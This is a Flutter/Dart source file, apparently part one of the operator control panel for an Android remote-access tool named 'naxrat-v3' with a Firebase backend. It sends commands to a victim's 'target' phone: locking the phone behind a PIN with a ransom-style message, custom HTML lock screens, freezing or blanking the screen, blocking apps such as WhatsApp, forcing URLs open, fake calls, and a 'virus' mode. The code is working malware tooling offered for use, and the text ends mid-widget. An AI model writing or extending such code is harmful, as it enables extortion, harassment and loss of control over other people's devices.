// ═══════════════════════════════════════════════════════════════════════════
//  CONTROL PAGE — TACTICAL REMOTE (GLASS BLACK + VIDEO BG)
//  PART 1/4
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:math' show Random;
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';
import 'main.dart';

const String kFirebaseUrl = 'https://naxrat-v3-default-rtdb.firebaseio.com';

// ═══ PALET WARNA — HITAM / PUTIH / MERAH ═══
class _C {
  static const bg = Color(0xFF000000);
  static const text = Color(0xFFFFFFFF);
  static const muted = Color(0xFF888888);
  static const border = Color(0xFF1E1E1E);
  static const borderHi = Color(0xFF3A3A3A);
  static const red = Color(0xFFFF2E2E);
  static const redDim = Color(0xFF8A1414);
}

class DeviceDetail {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceDetail({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class CommandLog {
  final String action;
  final int ts;
  final bool ok;

  CommandLog({required this.action, required this.ts, required this.ok});
}

class ChatMsg {
  final String id;
  final String sender;
  final String text;
  final int ts;

  ChatMsg({
    required this.id,
    required this.sender,
    required this.text,
    required this.ts,
  });
}

class ControlPage extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final String username;
  final String sessionKey;

  const ControlPage({
    super.key,
    required this.deviceId,
    required this.deviceName,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<ControlPage> createState() => _ControlPageState();
}

class _ControlPageState extends State<ControlPage>
    with WidgetsBindingObserver {
  DeviceDetail? _device;
  final List<CommandLog> _logs = [];
  bool _isLoading = true;

  Timer? _deviceRefreshTimer;

  List<ChatMsg> _chatMsgs = [];
  Timer? _chatPollTimer;
  final TextEditingController _chatCtrl = TextEditingController();
  final ScrollController _chatScrollCtrl = ScrollController();

  // VIDEO BG
  VideoPlayerController? _vCtrl;
  bool _videoReady = false;
  bool _videoInitializing = false;
  int _retry = 0;
  final GlobalKey _videoKey = GlobalKey();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    WidgetsBinding.instance.addPostFrameCallback((_) => _initVideo());
    _loadLogs();
    _refreshDevice(showLoading: true);

    _deviceRefreshTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      if (mounted) _refreshDevice();
    });
  }

  Future<void> _initVideo() async {
    if (_videoInitializing) return;
    _videoInitializing = true;
    try {
      final old = _vCtrl;
      _vCtrl = null;
      if (old != null) {
        try {
          await old.pause();
        } catch (_) {}
        try {
          await old.dispose();
        } catch (_) {}
      }
      final c = VideoPlayerController.asset('assets/videos/background.mp4');
      await c.initialize();
      await c.setLooping(true);
      await c.setVolume(0);
      c.addListener(() {
        final v = c.value;
        if (v.isInitialized &&
            !v.isPlaying &&
            v.position >= v.duration &&
            v.duration > Duration.zero) {
          c.seekTo(Duration.zero).catchError((_) {});
          c.play().catchError((_) {});
        }
      });
      await c.play();
      if (!mounted) {
        await c.dispose();
        _videoInitializing = false;
        return;
      }
      setState(() {
        _vCtrl = c;
        _videoReady = true;
      });
    } catch (_) {
      _videoInitializing = false;
      if (!mounted) return;
      if (_retry < 3) {
        _retry++;
        Future.delayed(Duration(milliseconds: 400 * _retry), () {
          if (mounted) _initVideo();
        });
      }
      return;
    }
    _videoInitializing = false;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    final c = _vCtrl;
    if (c == null || !c.value.isInitialized) return;
    if (state == AppLifecycleState.resumed) {
      if (!c.value.isPlaying) c.play().catchError((_) {});
    } else if (state == AppLifecycleState.paused) {
      c.pause().catchError((_) {});
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _deviceRefreshTimer?.cancel();
    _chatPollTimer?.cancel();
    _chatCtrl.dispose();
    _chatScrollCtrl.dispose();
    final c = _vCtrl;
    _vCtrl = null;
    if (c != null) {
      try {
        c.pause();
      } catch (_) {}
      try {
        c.dispose();
      } catch (_) {}
    }
    super.dispose();
  }

  Future<void> _refreshDevice({bool showLoading = false}) async {
    if (showLoading && mounted) setState(() => _isLoading = true);
    try {
      final res = await http
          .get(Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}.json'))
          .timeout(const Duration(seconds: 10));
      if (res.statusCode != 200) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }
      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }
      final now = DateTime.now().millisecondsSinceEpoch;
      int lastSeen = 0;
      final rawSeen = data['last_seen'];
      if (rawSeen is int) lastSeen = rawSeen;
      else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;
      final online = lastSeen > 0 && (now - lastSeen) < 2 * 60 * 1000;
      int? battery;
      final b = data['battery'];
      if (b is int) battery = b;
      else if (b is double) battery = b.toInt();
      if (!mounted) return;
      setState(() {
        _device = DeviceDetail(
          id: widget.deviceId,
          name: data['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: data['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        );
        _isLoading = false;
      });
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _loadLogs() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final raw = prefs.getString('cmd_logs_${widget.deviceId}');
      if (raw == null) return;
      final list = jsonDecode(raw) as List;
      if (!mounted) return;
      setState(() {
        _logs.clear();
        for (final item in list) {
          _logs.add(CommandLog(
            action: item['action']?.toString() ?? '',
            ts: (item['ts'] as num?)?.toInt() ?? 0,
            ok: item['ok'] == true,
          ));
        }
      });
    } catch (_) {}
  }

  Future<void> _addLog(String action, bool ok) async {
    setState(() {
      _logs.insert(
          0,
          CommandLog(
              action: action,
              ts: DateTime.now().millisecondsSinceEpoch,
              ok: ok));
      if (_logs.length > 10) _logs.removeLast();
    });
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(
          'cmd_logs_${widget.deviceId}',
          jsonEncode(_logs
              .map((l) => {'action': l.action, 'ts': l.ts, 'ok': l.ok})
              .toList()));
    } catch (_) {}
  }

  Future<bool> _sendCommand(String action,
      [Map<String, dynamic> payload = const {}]) async {
    if (_device == null) {
      _showSnack('Device tidak ditemukan', error: true);
      return false;
    }
    if (!_device!.online) {
      _showSnack('Device sedang offline', error: true);
      return false;
    }
    final cmdId =
        'cmd_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(999999)}';
    final cmd = {
      'action': action,
      'payload': payload,
      'ts': DateTime.now().millisecondsSinceEpoch,
      'status': 'pending',
    };
    try {
      final res = await http
          .put(
            Uri.parse(
                '$kFirebaseUrl/devices/${widget.deviceId}/commands/$cmdId.json'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(cmd),
          )
          .timeout(const Duration(seconds: 10));
      if (res.statusCode == 200 || res.statusCode == 204) {
        await _addLog(action, true);
        return true;
      } else {
        await _addLog(action, false);
        _showSnack('Firebase HTTP ${res.statusCode}', error: true);
        return false;
      }
    } catch (e) {
      await _addLog(action, false);
      _showSnack('Gagal: $e', error: true);
      return false;
    }
  }

  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 0) return 'baru';
    final sec = diff ~/ 1000;
    if (sec < 60) return '${sec}s';
    final min = sec ~/ 60;
    if (min < 60) return '${min}m';
    final hr = min ~/ 60;
    if (hr < 24) return '${hr}j';
    return '${hr ~/ 24}h';
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color = error ? _C.red : (success ? _C.text : _C.red);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: Colors.black.withOpacity(0.9),
      content: Row(children: [
        Icon(error ? Icons.error_outline : Icons.check_circle_outline,
            color: color, size: 20),
        const SizedBox(width: 10),
        Expanded(
            child: Text(msg,
                style: TextStyle(
                    color: color,
                    fontWeight: FontWeight.w800,
                    fontSize: 12,
                    letterSpacing: 1))),
      ]),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: color.withOpacity(0.5))),
      margin: const EdgeInsets.all(16),
      duration: const Duration(seconds: 2),
    ));
  }

  Future<void> _handleAction(String act) async {
    HapticFeedback.mediumImpact();
    switch (act) {
      case 'lock': _showLockDialog(); break;
      case 'unlock': if (await _sendCommand('unlock')) _showSnack('UNLOCK OK', success: true); break;
      case 'custom_lock': _showCustomLockDialog(); break;
      case 'custom_lock_html': _showHtmlLockDialog(); break;
      case 'lcd_on': if (await _sendCommand('lcd_on')) _showSnack('LCD ON OK', success: true); break;
      case 'lcd_off': if (await _sendCommand('lcd_off')) _showSnack('LCD OFF OK', success: true); break;
      case 'chat_lock_on': _openChat(); break;
      case 'chat_lock_off': if (await _sendCommand('chat_lock_off')) _showSnack('CHAT LOCK OFF OK', success: true); break;
      case 'freeze_on': if (await _sendCommand('freeze_on')) _showSnack('FREEZE ON OK', success: true); break;
      case 'freeze_off': if (await _sendCommand('freeze_off')) _showSnack('FREEZE OFF OK', success: true); break;
      case 'blank_on': if (await _sendCommand('blank_on')) _showSnack('BLANK ON OK', success: true); break;
      case 'blank_off': if (await _sendCommand('blank_off')) _showSnack('BLANK OFF OK', success: true); break;
      case 'ambacong_on': if (await _sendCommand('ambacong_on')) _showSnack('AMBACONG ON OK', success: true); break;
      case 'ambacong_off': if (await _sendCommand('ambacong_off')) _showSnack('AMBACONG OFF OK', success: true); break;
      case 'virus_amba_on': if (await _sendCommand('virus_amba_on')) _showSnack('VIRUS ON OK', success: true); break;
      case 'virus_amba_off': if (await _sendCommand('virus_amba_off')) _showSnack('VIRUS OFF OK', success: true); break;
      case 'keyboard_on': if (await _sendCommand('keyboard_on')) _showSnack('KEYBOARD ON OK', success: true); break;
      case 'keyboard_off': if (await _sendCommand('keyboard_off')) _showSnack('KEYBOARD OFF OK', success: true); break;
      case 'video_on': if (await _sendCommand('video_on')) _showSnack('VIDEO ON OK', success: true); break;
      case 'video_off': if (await _sendCommand('video_off')) _showSnack('VIDEO OFF OK', success: true); break;
      case 'flash_on': if (await _sendCommand('flash_on')) _showSnack('FLASH ON OK', success: true); break;
      case 'flash_off': if (await _sendCommand('flash_off')) _showSnack('FLASH OFF OK', success: true); break;
      case 'flash_blink': if (await _sendCommand('flash_blink')) _showSnack('FLASH BLINK OK', success: true); break;
      case 'play_sound': _showSoundDialog(); break;
      case 'stop_sound': if (await _sendCommand('stop_sound')) _showSnack('SOUND STOP OK', success: true); break;
      case 'wallpaper': _showWallpaperDialog(); break;
      case 'prank_call': _showPrankDialog(); break;
      case 'open_url': _showUrlDialog(); break;
      case 'vibrate': _showVibrateDialog(); break;
      case 'tts': _showTtsDialog(); break;
      case 'block_app': _showBlockAppDialog(); break;
      case 'unblock_all': if (await _sendCommand('unblock_all')) _showSnack('UNBLOCK ALL OK', success: true); break;
    }
  }
  // ═══ DIALOG LOCK ═══
void _showLockDialog() {
  final pinCtrl = TextEditingController();
  final msgCtrl = TextEditingController(text: 'Perangkat ini terkunci.');
  _showDialog(
    title: 'LOCK DEVICE',
    subtitle: 'Device target akan terkunci dengan PIN.',
    children: [
      _dialogField('PIN (4-8 digit)', pinCtrl, keyboard: TextInputType.number),
      _dialogField('Pesan', msgCtrl, maxLines: 3),
    ],
    confirmLabel: 'KUNCI',
    onConfirm: () async {
      final pin = pinCtrl.text.trim();
      final msg = msgCtrl.text.trim();
      if (pin.length < 4 || int.tryParse(pin) == null) {
        _showSnack('PIN minimal 4 digit', error: true);
        return false;
      }
      if (msg.isEmpty) {
        _showSnack('Pesan kosong', error: true);
        return false;
      }
      final ok = await _sendCommand('lock', {'pin': pin, 'message': msg});
      if (ok) _showSnack('LOCK OK', success: true);
      return ok;
    },
  );
}

void _showCustomLockDialog() {
  final durCtrl = TextEditingController(text: '60');
  _showDialog(
    title: 'CUSTOM LOCK',
    subtitle: 'Kunci sementara lalu buka otomatis.',
    children: [
      _dialogField('Durasi (detik)', durCtrl, keyboard: TextInputType.number)
    ],
    confirmLabel: 'KUNCI',
    onConfirm: () async {
      final dur = int.tryParse(durCtrl.text.trim());
      if (dur == null || dur < 5 || dur > 3600) {
        _showSnack('Durasi 5-3600 detik', error: true);
        return false;
      }
      final ok = await _sendCommand('custom_lock', {'duration': dur});
      if (ok) _showSnack('CUSTOM LOCK OK', success: true);
      return ok;
    },
  );
}

void _showHtmlLockDialog() {
  final htmlCtrl = TextEditingController();
  _showDialog(
    title: 'HTML LOCK',
    subtitle: 'Tulis HTML untuk lock screen.',
    children: [_dialogField('Kode HTML', htmlCtrl, maxLines: 6)],
    confirmLabel: 'KUNCI',
    onConfirm: () async {
      final html = htmlCtrl.text.trim();
      if (html.isEmpty) {
        _showSnack('HTML kosong', error: true);
        return false;
      }
      final ok = await _sendCommand('custom_lock_html', {'html': html});
      if (ok) _showSnack('HTML LOCK OK', success: true);
      return ok;
    },
  );
}

void _showUrlDialog() {
  final urlCtrl = TextEditingController();
  _showDialog(
    title: 'BUKA URL',
    subtitle: 'Buka website di browser target.',
    children: [_dialogField('URL', urlCtrl, keyboard: TextInputType.url)],
    confirmLabel: 'BUKA',
    onConfirm: () async {
      var url = urlCtrl.text.trim();
      if (url.isEmpty) {
        _showSnack('URL kosong', error: true);
        return false;
      }
      if (!url.startsWith('http')) url = 'https://$url';
      final ok = await _sendCommand('open_url', {'url': url});
      if (ok) _showSnack('URL OK', success: true);
      return ok;
    },
  );
}

void _showVibrateDialog() {
  final durCtrl = TextEditingController(text: '2000');
  _showDialog(
    title: 'VIBRATE DEVICE',
    subtitle: 'Getarkan HP target.',
    children: [
      _dialogField('Durasi (ms)', durCtrl, keyboard: TextInputType.number)
    ],
    confirmLabel: 'GETARKAN',
    onConfirm: () async {
      final dur = int.tryParse(durCtrl.text.trim());
      if (dur == null || dur < 100 || dur > 60000) {
        _showSnack('Durasi 100-60000 ms', error: true);
        return false;
      }
      final ok = await _sendCommand('vibrate', {'duration': dur});
      if (ok) _showSnack('VIBRATE OK', success: true);
      return ok;
    },
  );
}

void _showSoundDialog() {
  final urlCtrl = TextEditingController();
  _showDialog(
    title: 'PLAY SOUND',
    subtitle: 'Putar audio dari URL di target.',
    children: [
      _dialogField('URL Audio', urlCtrl, keyboard: TextInputType.url)
    ],
    confirmLabel: 'PUTAR',
    onConfirm: () async {
      var url = urlCtrl.text.trim();
      if (url.isEmpty) {
        _showSnack('URL kosong', error: true);
        return false;
      }
      if (!url.startsWith('http')) url = 'https://$url';
      final ok = await _sendCommand('play_sound', {'url': url});
      if (ok) _showSnack('SOUND OK', success: true);
      return ok;
    },
  );
}

void _showWallpaperDialog() {
  final urlCtrl = TextEditingController();
  _showDialog(
    title: 'SET WALLPAPER',
    subtitle: 'Masukkan URL gambar untuk wallpaper.',
    children: [
      _dialogField('URL Gambar', urlCtrl, keyboard: TextInputType.url),
      const Padding(
        padding: EdgeInsets.only(top: 4),
        child: Text('Contoh: https://example.com/image.jpg',
            style: TextStyle(color: _C.muted, fontSize: 11)),
      ),
    ],
    confirmLabel: 'PASANG',
    onConfirm: () async {
      var url = urlCtrl.text.trim();
      if (url.isEmpty) {
        _showSnack('URL kosong', error: true);
        return false;
      }
      if (!url.startsWith('http')) url = 'https://$url';
      final ok = await _sendCommand('wallpaper', {'url': url});
      if (ok) _showSnack('WALLPAPER OK', success: true);
      return ok;
    },
  );
}

void _showPrankDialog() {
  final nameCtrl = TextEditingController(text: 'Mama');
  final numCtrl = TextEditingController(text: '+62 812-3456-7890');
  _showDialog(
    title: 'PRANK CALL',
    subtitle: 'Simulasi panggilan masuk.',
    children: [
      _dialogField('Nama Penelepon', nameCtrl),
      _dialogField('Nomor', numCtrl, keyboard: TextInputType.phone),
    ],
    confirmLabel: 'PANGGIL',
    onConfirm: () async {
      final name = nameCtrl.text.trim();
      final num = numCtrl.text.trim();
      final ok = await _sendCommand('prank_call', {'name': name, 'number': num});
      if (ok) _showSnack('PRANK OK', success: true);
      return ok;
    },
  );
}

void _showBlockAppDialog() {
  final pkgCtrl = TextEditingController();
  _showDialog(
    title: 'BLOCK APP',
    subtitle: 'Masukkan package name app target.',
    children: [
      _dialogField('Package Name', pkgCtrl, hint: 'com.whatsapp'),
      const Padding(
        padding: EdgeInsets.only(top: 4),
        child: Text('Contoh: com.whatsapp • com.instagram.android',
            style: TextStyle(color: _C.muted, fontSize: 11)),
      ),
    ],
    confirmLabel: 'BLOCK',
    onConfirm: () async {
      final pkg = pkgCtrl.text.trim();
      if (pkg.isEmpty) {
        _showSnack('Package kosong', error: true);
        return false;
      }
      final ok = await _sendCommand('block_app', {'app': pkg, 'name': pkg});
      if (ok) _showSnack('BLOCKED: $pkg', success: true);
      return ok;
    },
  );
}

void _showTtsDialog() {
  final textCtrl = TextEditingController();
  String lang = 'id';
  String rate = '1.0';
  showDialog(
    context: context,
    builder: (ctx) => StatefulBuilder(
      builder: (context, setStateDialog) {
        return Dialog(
          backgroundColor: Colors.transparent,
          child: _GlassCard(
            padding: const EdgeInsets.all(22),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                const Text('TEXT TO SPEECH',
                    style: TextStyle(
                        fontSize: 20,
                        fontWeight: FontWeight.w900,
                        color: Colors.white,
                        letterSpacing: 1.5)),
                const SizedBox(height: 6),
                const Text('Target bakal ngomong teks yang kamu ketik.',
                    style: TextStyle(fontSize: 12, color: _C.muted)),
                const SizedBox(height: 16),
                _dialogField('Teks', textCtrl, maxLines: 3, maxLength: 300),
                const SizedBox(height: 10),
                const Text('BAHASA',
                    style: TextStyle(
                        fontSize: 11,
                        fontWeight: FontWeight.w800,
                        color: Colors.white70,
                        letterSpacing: 1)),
                const SizedBox(height: 6),
                _dropdownWrap(
                  value: lang,
                  items: const {
                    'id': 'Indonesia',
                    'en': 'Inggris',
                    'ja': 'Jepang',
                    'ko': 'Korea',
                    'zh': 'Mandarin',
                  },
                  onChanged: (v) => setStateDialog(() => lang = v),
                ),
                const SizedBox(height: 10),
                const Text('KECEPATAN',
                    style: TextStyle(
                        fontSize: 11,
                        fontWeight: FontWeight.w800,
                        color: Colors.white70,
                        letterSpacing: 1)),
                const SizedBox(height: 6),
                _dropdownWrap(
                  value: rate,
                  items: const {
                    '0.7': 'Lambat',
                    '1.0': 'Normal',
                    '1.5': 'Cepat',
                    '2.0': 'Sangat Cepat',
                  },
                  onChanged: (v) => setStateDialog(() => rate = v),
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: _SecondaryBtn(
                        label: 'BATAL',
                        onTap: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: _PrimaryBtn(
                        label: 'NGOMONG',
                        onTap: () async {
                          final text = textCtrl.text.trim();
                          if (text.isEmpty) {
                            _showSnack('Teks kosong', error: true);
                            return;
                          }
                          Navigator.pop(ctx);
                          final ok = await _sendCommand('tts', {
                            'text': text,
                            'lang': lang,
                            'rate': double.parse(rate),
                          });
                          if (ok) _showSnack('TTS OK', success: true);
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        );
      },
    ),
  );
}
Widget _dropdownWrap({
  required String value,
  required Map<String, String> items,
  required ValueChanged<String> onChanged,
}) {
  return Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 2),
    decoration: BoxDecoration(
      color: Colors.white.withOpacity(0.05),
      borderRadius: BorderRadius.circular(12),
      border: Border.all(color: Colors.white.withOpacity(0.12)),
    ),
    child: DropdownButtonHideUnderline(
      child: DropdownButton<String>(
        value: value,
        isExpanded: true,
        dropdownColor: const Color(0xFF0A0A0A),
        style: const TextStyle(fontSize: 14, color: Colors.white),
        icon: const Icon(Icons.keyboard_arrow_down_rounded,
            color: _C.red, size: 22),
        items: items.entries
            .map((e) =>
                DropdownMenuItem(value: e.key, child: Text(e.value)))
            .toList(),
        onChanged: (v) {
          if (v != null) onChanged(v);
        },
      ),
    ),
  );
}

void _showDialog({
  required String title,
  required String subtitle,
  required List<Widget> children,
  required String confirmLabel,
  required Future<bool> Function() onConfirm,
}) {
  showDialog(
    context: context,
    builder: (ctx) => Dialog(
      backgroundColor: Colors.transparent,
      child: _GlassCard(
        padding: const EdgeInsets.all(22),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Text(title,
                style: const TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 1.5)),
            const SizedBox(height: 6),
            Text(subtitle,
                style: const TextStyle(fontSize: 12, color: _C.muted)),
            const SizedBox(height: 16),
            ...children,
            const SizedBox(height: 18),
            Row(
              children: [
                Expanded(
                  child: _SecondaryBtn(
                    label: 'BATAL',
                    onTap: () => Navigator.pop(ctx),
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: _PrimaryBtn(
                    label: confirmLabel,
                    onTap: () async {
                      final ok = await onConfirm();
                      if (ok && ctx.mounted) Navigator.pop(ctx);
                    },
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    ),
  );
}

Widget _dialogField(String label, TextEditingController ctrl,
    {TextInputType keyboard = TextInputType.text,
    int maxLines = 1,
    int? maxLength,
    String? hint}) {
  return Padding(
    padding: const EdgeInsets.only(bottom: 12),
    child: Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(label,
            style: const TextStyle(
                fontSize: 11,
                fontWeight: FontWeight.w800,
                color: Colors.white70,
                letterSpacing: 1)),
        const SizedBox(height: 6),
        TextField(
          controller: ctrl,
          keyboardType: keyboard,
          maxLines: maxLines,
          maxLength: maxLength,
          style: const TextStyle(fontSize: 14, color: Colors.white),
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: const TextStyle(color: _C.muted, fontSize: 13),
            filled: true,
            fillColor: Colors.white.withOpacity(0.05),
            contentPadding:
                const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: Colors.white.withOpacity(0.12)),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: Colors.white.withOpacity(0.12)),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: _C.red, width: 1.5),
            ),
          ),
        ),
      ],
    ),
  );
}

// ═══ CHAT ═══
Future<void> _openChat() async {
  if (_device == null || !_device!.online) {
    _showSnack('Device offline', error: true);
    return;
  }
  await _sendCommand('chat_lock_on');
  if (!mounted) return;
  setState(() => _chatMsgs = []);
  _startChatPolling();
  showModalBottomSheet(
    context: context,
    isScrollControlled: true,
    backgroundColor: Colors.transparent,
    builder: (_) => _buildChatSheet(),
  ).whenComplete(() => _stopChatPolling());
}

void _startChatPolling() {
  _stopChatPolling();
  _loadChatMessages();
  _chatPollTimer =
      Timer.periodic(const Duration(seconds: 2), (_) => _loadChatMessages());
}

void _stopChatPolling() {
  _chatPollTimer?.cancel();
  _chatPollTimer = null;
}

Future<void> _loadChatMessages() async {
  try {
    final res = await http.get(Uri.parse(
        '$kFirebaseUrl/devices/${widget.deviceId}/chat_lock.json'));
    if (res.statusCode != 200) return;
    final data = jsonDecode(res.body);
    if (data == null) return;
    final list = <ChatMsg>[];
    (data as Map<String, dynamic>).forEach((id, raw) {
      if (raw == null) return;
      final m = raw as Map<String, dynamic>;
      list.add(ChatMsg(
        id: id,
        sender: m['sender']?.toString() ?? 'unknown',
        text: m['text']?.toString() ?? '',
        ts: (m['ts'] as num?)?.toInt() ?? 0,
      ));
    });
    list.sort((a, b) => a.ts.compareTo(b.ts));
    if (!mounted) return;
    final hasNew = list.length != _chatMsgs.length;
    setState(() => _chatMsgs = list);
    if (hasNew) {
      Future.delayed(const Duration(milliseconds: 100), () {
        if (_chatScrollCtrl.hasClients) {
          _chatScrollCtrl.animateTo(
            _chatScrollCtrl.position.maxScrollExtent,
            duration: const Duration(milliseconds: 250),
            curve: Curves.easeOut,
          );
        }
      });
    }
  } catch (_) {}
}

Future<void> _sendChatMessage() async {
  final text = _chatCtrl.text.trim();
  if (text.isEmpty) return;
  final id =
      'msg_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(99999)}';
  try {
    final res = await http.put(
      Uri.parse(
          '$kFirebaseUrl/devices/${widget.deviceId}/chat_lock/$id.json'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'sender': 'admin',
        'text': text,
        'ts': DateTime.now().millisecondsSinceEpoch
      }),
    );
    if (res.statusCode == 200 || res.statusCode == 204) {
      _chatCtrl.clear();
      await _sendCommand('chat_lock_notify', {'msg': text, 'id': id});
    }
  } catch (e) {
    _showSnack('Gagal kirim chat', error: true);
  }
}

Widget _buildChatSheet() {
  return Padding(
    padding:
        EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
    child: ClipRRect(
      borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 16, sigmaY: 16),
        child: Container(
          height: MediaQuery.of(context).size.height * 0.72,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.88),
            border: Border(
                top: BorderSide(
                    color: Colors.white.withOpacity(0.12), width: 1)),
          ),
          child: Column(
            children: [
              Container(
                padding: const EdgeInsets.all(18),
                decoration: BoxDecoration(
                  border: Border(
                      bottom: BorderSide(
                          color: Colors.white.withOpacity(0.08))),
                ),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _C.red.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border:
                            Border.all(color: _C.red.withOpacity(0.6)),
                      ),
                      child:
                          const Icon(Icons.chat_rounded, color: _C.red, size: 22),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(_device?.name ?? 'Target',
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                              style: const TextStyle(
                                  fontSize: 16,
                                  fontWeight: FontWeight.w900,
                                  color: Colors.white,
                                  letterSpacing: 1)),
                          const SizedBox(height: 2),
                          const Text('CHAT LOCK',
                              style: TextStyle(
                                  fontSize: 10,
                                  color: _C.muted,
                                  letterSpacing: 1.5)),
                        ],
                      ),
                    ),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: _C.red.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: _C.red),
                        ),
                        child: const Icon(Icons.close_rounded,
                            color: _C.red, size: 20),
                      ),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: _chatMsgs.isEmpty
                    ? const Center(
                        child: Text('BELUM ADA PESAN',
                            style: TextStyle(
                                fontSize: 14,
                                fontWeight: FontWeight.w800,
                                color: _C.muted,
                                letterSpacing: 1.5)))
                    : ListView.builder(
                        controller: _chatScrollCtrl,
                        padding: const EdgeInsets.all(16),
                        itemCount: _chatMsgs.length,
                        itemBuilder: (_, i) => _buildChatBubble(_chatMsgs[i]),
                      ),
              ),
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  border: Border(
                      top: BorderSide(
                          color: Colors.white.withOpacity(0.08))),
                ),
                child: Row(
                  children: [
                    Expanded(
                      child: Container(
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                              color: Colors.white.withOpacity(0.12)),
                        ),
                        child: TextField(
                          controller: _chatCtrl,
                          style: const TextStyle(
                              fontSize: 14, color: Colors.white),
                          maxLines: 4,
                          minLines: 1,
                          onSubmitted: (_) => _sendChatMessage(),
                          decoration: const InputDecoration(
                            hintText: 'Tulis pesan...',
                            hintStyle: TextStyle(
                                color: _C.muted, fontSize: 13),
                            border: InputBorder.none,
                            contentPadding: EdgeInsets.symmetric(
                                horizontal: 14, vertical: 12),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    GestureDetector(
                      onTap: _sendChatMessage,
                      child: Container(
                        width: 48,
                        height: 48,
                        decoration: BoxDecoration(
                          color: _C.red,
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: [
                            BoxShadow(
                                color: _C.red.withOpacity(0.4),
                                blurRadius: 12)
                          ],
                        ),
                        child: const Icon(Icons.send_rounded,
                            color: Colors.black, size: 22),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    ),
  );
}

Widget _buildChatBubble(ChatMsg m) {
  final isMine = m.sender == 'admin';
  final time = DateTime.fromMillisecondsSinceEpoch(m.ts);
  final timeStr =
      '${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}';

  return Align(
    alignment: isMine ? Alignment.centerRight : Alignment.centerLeft,
    child: Container(
      margin: const EdgeInsets.only(bottom: 10),
      constraints:
          BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.72),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: BoxDecoration(
        color: isMine
            ? _C.red.withOpacity(0.9)
            : Colors.white.withOpacity(0.08),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
            color: isMine
                ? _C.red
                : Colors.white.withOpacity(0.12),
            width: 1),
      ),
      child: Column(
